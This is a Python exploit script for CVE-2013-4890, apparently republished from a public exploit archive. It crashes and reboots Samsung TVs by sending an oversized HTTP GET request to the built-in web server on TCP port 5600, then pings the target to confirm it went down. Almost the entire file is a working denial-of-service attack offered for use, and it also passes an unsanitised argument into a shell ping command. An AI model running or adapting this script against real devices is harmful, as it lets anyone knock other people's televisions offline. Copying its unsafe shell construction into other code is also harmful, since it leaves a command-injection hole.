#!/usr/bin/python
#
# Exploit Title: Samsung TV Denial of Service (DoS) Attack
# Exploit Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com
# Rec0ded by: pedr0 ubuntu aka r00t-3xp10it
#
# Date: 07/21/2013
# CVE Number: CVE-2013-4890
# Vendor Homepage: http://www.samsung.com
#
# Description:
# The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long
# HTTP GET request As a results, the TV reboots...
# Tested successfully on my Samsung PS50C7700 plasma TV, with the latest firmware :)
#
###



# ----------------------------
# import dependencies 
# ----------------------------
import httplib
import time
import sys
import os
import time



# ----------------------------
# script colorize output
# ----------------------------
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[32m'
WHITE  = '\033[0m'  
ORANGE  = '\033[33m'



# ----------------------------
# exploit banner
# ----------------------------
print BLUE+"**************************************************************"
print WHITE+"  Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com"
print WHITE+"  Exploit: Denial of Service (DoS) attack"
print WHITE+"  Rec0ded by: pedr0 ubuntu aka r00t-3xp10it"
print ""
print WHITE+"  Description:"
print WHITE+"  The web server (DMCRUIS/0.1) on port TCP/5600"
print WHITE+"  is crashing by sending a long HTTP GET request."
print WHITE+"  Tested successfully on my Samsung PS50C7700 plasma TV :)"
print BLUE+"**************************************************************"




# ----------------------------
# Sends the payload
# ----------------------------
print ""
print BLUE+"[*]"+GREEN+" press ctrl+z to stop"
print BLUE+"[*]"+WHITE+" Sending the malicious payload..."
conn = httplib.HTTPConnection(sys.argv[1],5600)
conn.request("GET", "A"*300)
conn.close()

# ----------------------------
# Checks the response
# ----------------------------
print BLUE+"[*]"+WHITE+" Checking the status..."
response = 0
while response == 0:
  response = os.system("ping -c 1 " + sys.argv[1] + "> /dev/null 2>&1")
  if response != 0:
    print BLUE+"[*]"+GREEN+" (Success):"+RED+" the target seems to be down !!!"
    print WHITE+""
time.sleep(10)


